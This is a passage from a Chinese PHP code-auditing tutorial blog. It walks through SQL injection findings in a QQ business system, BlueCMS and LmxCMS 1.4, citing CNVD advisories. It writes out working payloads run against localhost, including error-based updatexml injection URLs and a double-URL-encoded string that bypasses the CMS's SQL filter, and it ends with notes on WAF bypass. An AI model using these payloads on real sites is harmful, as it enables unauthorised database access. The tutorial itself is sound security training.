href="#数据库监控-QQ业务源码系统-无过滤" class="headerlink" title="#数据库监控-QQ业务源码系统-(无过滤)"></a>#数据库监控-QQ业务源码系统-(无过滤)</h4><p>数据库SQL监控排查可利用语句定向分析     <strong>（一般带where的后面接的就是变量名）</strong></p><p>前面的语句都已经<strong>固定了列名写死了没有变量</strong>，所以不考虑，而只有这个语句的127.0.0.1才有可能可以改变的</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327161213127.png" alt="image-20230327161213127"></p><p>在源码中搜上面这条sql语句，发现如果有like后面的内容127.0.0.1就搜索不到结果</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327161534695.png" alt="image-20230327161534695"></p><p>而只搜索前面的部分就显示有结果了，说明此处ip是变量，127.0.0.1就是变量ip控制的，可以更改，后面可以紧跟一下这个语句</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327161654546.png" alt="image-20230327161654546"></p><p> 打开看到确实是变量ip控制的</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327161756255.png" alt="image-20230327161756255"></p><p>所以紧跟一下这个函数ywdd()，看看是谁调用的这个函数，函数方法要被调用才有用，全局搜索这个函数，发现另一处有调用这个</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327162107003.png" alt="image-20230327162107003"></p><p>进去发现是ywdd包含了getip()这个方法</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327162209199.png" alt="image-20230327162209199"></p><p>点击定位这个函数</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327162254545.png" alt="image-20230327162254545"></p><p>点击去发现HTTP_X_FORWARDED_FOR</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327162501243.png" alt="image-20230327162501243"></p><p>这个在28天<strong>XFF（X-Forwarded-For: 127.0.0.1）</strong>头注入讲过，是一个接收ip的函数,根据上面的ywdd方法里面没有对ip进行过滤的代码，所以断定这个地方有sql注入</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327162412732.png" alt="image-20230327162412732"></p><p>抓包，并且添加一个xff参数，写个1.1.1.1，观察数据库的执行语句，发现也是变成了1.1.1.1，说明变量可控</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327163337049.png" alt="image-20230327163337049"></p><p>构造sql语句，漏洞发掘</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327163542012.png" alt="image-20230327163542012"></p><h4 id="正则表达式-Bluecms源码系统-无过滤"><a href="#正则表达式-Bluecms源码系统-无过滤" class="headerlink" title="#正则表达式-Bluecms源码系统-(无过滤)"></a>#正则表达式-Bluecms源码系统-(无过滤)</h4><p>正则表达式：(update|select|insert|delete|).<em>?where.</em>&#x3D;\</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327164442183.png" alt="image-20230327164442183"></p><p>roder by后面的这种变量是注入不了的，因为这个是对这个里面的数据进行排序DESC是指从大到小排序</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327164715486.png" alt="image-20230327164715486"></p><p>找到刚才的那个地方看到getone，$db执行getone方法，但是这个方法可以判断不是官方的函数，是自己定义的，将$db执行的结果赋值给$ad</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327165436322.png" alt="image-20230327165436322"></p><p>一般语句会这样写，直接执行这个$sql<br><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327165343731.png" alt="image-20230327165343731"></p><p>所以跟踪下这个getone方法，一般只会用到声明和实现，声明就是定义这个函数的地方，而实现就是调用这个函数的地方</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327165131774.png" alt="image-20230327165131774"></p><p>显示$query方法</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327165700819.png" alt="image-20230327165700819"></p><p>如果不确定，可以继续跟踪下，跟踪到了这个方法，基本可以确定刚才的getone就是执行sql语句的方法</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327165739476.png" alt="image-20230327165739476"></p><p>跟踪一下刚才的变量$ad_id，找到它第一次出现的地方，可以看到这个地方没有对变量进行过滤，唯一可能存在过滤的地方就是getone，刚才跟踪了几个和getone相关的也没有发现过滤的语句</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327170038146.png" alt="image-20230327170038146"></p><p>访文变量ad_id存在的文件</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327170439886.png" alt="image-20230327170439886"></p><p>为了调试方便，在这里echo出sql语句</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327170653979.png" alt="image-20230327170653979"></p><p>执行后发现没有结果，无回显？</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327170737042.png" alt="image-20230327170737042"></p><p>看代码分析，因为这里执行了语句后并没有将结果输出</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327170812802.png" alt="image-20230327170812802"></p><p>根据之前的课程，无回显可以采取延时注入</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327171022856.png" alt="image-20230327171022856"></p><p>在sqlmap上跑，发现这三种注入方式（布尔、延时、联合）都可以注入成功</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327171229732.png" alt="image-20230327171229732"></p><h4 id="CNVD拿1DAY-梦想CMS源码系统-有过滤"><a href="#CNVD拿1DAY-梦想CMS源码系统-有过滤" class="headerlink" title="#CNVD拿1DAY-梦想CMS源码系统-(有过滤)"></a>#CNVD拿1DAY-梦想CMS源码系统-(有过滤)</h4><h5 id="1、动态调试技术"><a href="#1、动态调试技术" class="headerlink" title="1、动态调试技术"></a>1、动态调试技术</h5><h5 id="2、文件对比技术"><a href="#2、文件对比技术" class="headerlink" title="2、文件对比技术"></a>2、文件对比技术</h5><h4 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h4><p>漏洞报告url：<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-59466">https://www.cnvd.org.cn/flaw/show/CNVD-2020-59466</a></p><h5 id="梦想CMS后台Bo-cl-php文件存在SQL注入漏洞"><a href="#梦想CMS后台Bo-cl-php文件存在SQL注入漏洞" class="headerlink" title="梦想CMS后台Bo***.cl***.php文件存在SQL注入漏洞"></a>梦想CMS后台Bo***.cl***.php文件存在SQL注入漏洞</h5><p><a href="http://localhost:8081/lmxcms1.4/admin.php?m=book&a=reply&id=1)%20and%20updatexml(0,concat(0x7e,user()),1)%23">http://localhost:8081/lmxcms1.4/admin.php?m=book&amp;a=reply&amp;id=1)%20and%20updatexml(0,concat(0x7e,user()),1)%23</a></p><p>这里说后台存在注入</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327172559593.png" alt="image-20230327172559593"></p><p>登录后台后点击内容管理</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327172943913.png" alt="image-20230327172943913"></p><p>跳转到这个页面</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327173508247.png" alt="image-20230327173508247"></p><p>在代码中依次找到这个页面的文件所在地</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327173853623.png" alt="image-20230327173853623"></p><p>根据漏洞介绍详细，找到这个文件，并发现了其中的参数id可以传值</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327174145926.png" alt="image-20230327174145926"></p><p>跟踪上面标记的调用参数id的getReply方法,发现selectModel调用这个id，这里id传值给了$param</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327174650200.png" alt="image-20230327174650200"></p><p>跟踪selectModel后，发现selectDB调用这个$param，并且通过$this-&gt;field可以发现param传值给了field<img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327174759807.png" alt="image-20230327174759807"></p><p>最终在selectDB方法里面找到了sql语句的地方,这里恰恰就是查询参数$field的地方，<strong>所以上述传值过程是$id-&gt;$param-&gt;$field</strong>,而且这里分析过来发现是<strong>没有过滤的</strong>，这里为了调试在下面输入echo $sql打印出sql语句</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327175019484.png" alt="image-20230327175019484"></p><p>所以访问最开始的reply方法的地方，这里构造url时m&#x3D;Book，忽略后面的统一标志Action.class.php,id随便输入一个</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327180129836.png" alt="image-20230327180129836"></p><p>通过上图可以发现没有回显，所以可以考虑报错注入，延时注入也行，这里报错回显成功</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327180629558.png" alt="image-20230327180629558"></p><h4 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h4><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-05674">https://www.cnvd.org.cn/flaw/show/CNVD-2019-05674</a></p><h5 id="LmxCMS-V1-4前台Ta-cl-php存在SQL注入漏洞"><a href="#LmxCMS-V1-4前台Ta-cl-php存在SQL注入漏洞" class="headerlink" title="LmxCMS V1.4前台Ta***.cl***.php存在SQL注入漏洞"></a>LmxCMS V1.4前台Ta***.cl***.php存在SQL注入漏洞</h5><p>前台的</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327180945816.png" alt="image-20230327180945816"></p><p>根据上图的漏洞介绍找到这个文件，只在这个文件里面发现了两个变量，一个data，一个name，而这里显示name是从data过来的，所以追踪data 的方法p</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327181430293.png" alt="image-20230327181430293"></p><p>从这里可以知道前面的data 是用GET方法接收参数的，而且这个地方有过滤</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327182703546.png" alt="image-20230327182703546"></p><p>跟踪一下filter_sql，看看过滤哪些，发现是正则匹配，基本上都过滤了包括大小写</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327183143065.png" alt="image-20230327183143065"></p><p>这个参数想要直接注入就行不通了，找另一个，刚才的name参数</p><p>浏览器的解码机制，只会解码一次</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327184406893.png" alt="image-20230327184406893"></p><p>例如：</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327184800901.png" alt="image-20230327184800901"></p><p>这个地方出现漏洞的问题就是他将数据又进行了一次解码，而且，这个编码发生在数据传送到浏览器通过以后才进行解码，导致了可以双重编码绕过</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230327185418013.png" alt="image-20230327185418013"></p><blockquote><p>上述的第1处，例如构造语句a’ and updatexml(0,concat(0x7e,user()),1)#，编码一次后，浏览器因为优先接收数据，会将其还原为原来的sql语句，导致过滤函数识别到了，所以无法绕过，但是二次编码后，浏览器解码一次后变成：%27%20and%20updatexml%280%2Cconcat%280x7e%2Cuser%28%29%29%2C1%29%23，随后，过滤机制检测，发现这个一次编码里面没有sql语句和敏感函数就放行，放行后经过第2处的urldecode的解码效果，变成了：a’ and updatexml(0,concat(0x7e,user()),1)#，从而这个语句被数据库接收，产生了注入</p></blockquote><p>随后跟踪一下这个获取name的方法getNnameData</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328090137130.png" alt="image-20230328090137130"></p><p>跟踪过去发现了有sql语句，参数传值，name将值传给了param继续跟踪一下oneModel方法</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328090248837.png" alt="image-20230328090248837"></p><p>oneModel里面又有oneDB方法，param将值传给了field，继续跟踪oneDB</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328090353740.png" alt="image-20230328090353740"></p><p>发现了最终的sql语句，打印一下sql语句</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328090655685.png" alt="image-20230328090655685"></p><p>因为最终在还是name传值过来的，所以输入payload为?m&#x3D;Tags&amp;name&#x3D;1（随便输入一个数字）</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328091131991.png" alt="image-20230328091131991"></p><p>观察到是单引号，所以闭合单引号构造语句并且双重编码</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328091508589.png" alt="image-20230328091508589"></p><p>无论是不编码还是编码一次，都无法绕过检测</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328091620962.png" alt="image-20230328091620962"></p><h4 id="如果，没有上面的漏洞介绍，不告诉你漏洞是在哪个文件呢？思路：找到其出了漏洞后更新后的版本，两个版本的文件进行对比，看看都有哪个文件进行了更改，代码哪个地方进行了修改（工具Beyond-Compare-4）这个方式，可以用来挖0day或者1day"><a href="#如果，没有上面的漏洞介绍，不告诉你漏洞是在哪个文件呢？思路：找到其出了漏洞后更新后的版本，两个版本的文件进行对比，看看都有哪个文件进行了更改，代码哪个地方进行了修改（工具Beyond-Compare-4）这个方式，可以用来挖0day或者1day" class="headerlink" title="如果，没有上面的漏洞介绍，不告诉你漏洞是在哪个文件呢？思路：找到其出了漏洞后更新后的版本，两个版本的文件进行对比，看看都有哪个文件进行了更改，代码哪个地方进行了修改（工具Beyond Compare 4）这个方式，可以用来挖0day或者1day"></a>如果，没有上面的漏洞介绍，不告诉你漏洞是在哪个文件呢？思路：找到其出了漏洞后更新后的版本，两个版本的文件进行对比，看看都有哪个文件进行了更改，代码哪个地方进行了修改（工具Beyond Compare 4）这个方式，可以用来挖0day或者1day</h4><h6 id="对比1-4与1-41文件代码不同更方便-Beyond-Compare-4"><a href="#对比1-4与1-41文件代码不同更方便-Beyond-Compare-4" class="headerlink" title="对比1.4与1.41文件代码不同更方便-Beyond Compare 4"></a>对比1.4与1.41文件代码不同更方便-Beyond Compare 4</h6><p><a href="http://localhost:8081/lmxcms1.4/?m=tags&name=%2561%2527%2520%2561%256e%2564%2520%2575%2570%2564%2561%2574%2565%2578%256d%256c%2528%2530%252c%2563%256f%256e%2563%2561%2574%2528%2530%2578%2537%2565%252c%2575%2573%2565%2572%2528%2529%2529%252c%2531%2529%2523">http://localhost:8081/lmxcms1.4/?m=tags&amp;name=%25%36%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%30%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%31%25%32%39%25%32%33</a></p><p>例如可以看到，刚才的漏洞，两个版本一对比，发现把这个地方修复了，右边修复的版本增加了过滤</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328092726862.png" alt="image-20230328092726862"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day80 WAF攻防-漏洞利用&amp;HPP污染&amp;分块传输&amp;垃圾数据</title>
      <link href="/2023/03/23/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/03/23/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、SQL注入&amp;文件上传绕过</p><p>2、XSS跨站&amp;其他漏洞绕过</p><p>3、HPP污染&amp;垃圾数据&amp;分块等</p><h3 id="参考点："><a href="#参考点：" class="headerlink" title="#参考点："></a>#参考点：</h3><h4 id="将MySQL注入函数分为几类"><a href="#将MySQL注入函数分为几类" class="headerlink" title="#将MySQL注入函数分为几类"></a>#将MySQL注入函数分为几类</h4><p>拆分字符串函数：mid、left、lpad等</p><p>编码函数：ord、hex、ascii等</p><p>运算函数：+ - *  &#x2F; &amp; ^ ! like rlike reg等</p><p>空格替换部分：09、0a、0b、0c、0d等</p><p>关键数据函数：user()、version()、database()等</p><p>然后将这些不同类型的函数组合拼接在一起</p><h3 id="上传参数名解析明确哪些东西能修改？"><a href="#上传参数名解析明确哪些东西能修改？" 